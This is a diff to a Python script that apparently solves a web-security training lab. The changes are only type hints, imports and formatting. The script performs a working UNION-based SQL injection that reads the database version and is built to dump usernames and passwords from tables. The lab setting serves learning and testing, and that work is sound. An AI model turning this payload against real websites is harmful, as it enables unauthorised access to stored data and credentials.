@@ -3,28 +3,27 @@
 SQL injection attack, querying the database type and version on MySQL and Microsoft
 """
 
-from typing import List
-
-import bs4
 import requests
 
 import lab_06
 
+
 class Lab(lab_06.Lab):
     """Wrapper"""
 
-    def dump_table_encoded(self, fields: List[str],
+    def dump_table_encoded(self, fields: list[str],
                            table: str = "") -> requests.models.Response:
         """Get usernames and passwords"""
         fields_str = ",+".join(fields)
         if table:
             table = f"+FROM+{table}"
         payload = {self.key: f"%27+UNION+SELECT+{fields_str}" \
-                             + f"{table}{self.comment}"}
+                             f"{table}{self.comment}"}
         payload_str = self._dict_to_str(payload)
         response = self.session.get(self.url + self.path, params=payload_str)
         response.raise_for_status()
         return response
+
 
 def main() -> None:
     """Entry point"""
@@ -34,6 +33,7 @@ def main() -> None:
     response = site.dump_table_encoded(["@@version", "NULL"])
     version = "\n".join(site.parse_html_table(response.text))
     print(version)
+
 
 if __name__ == "__main__":
     main()
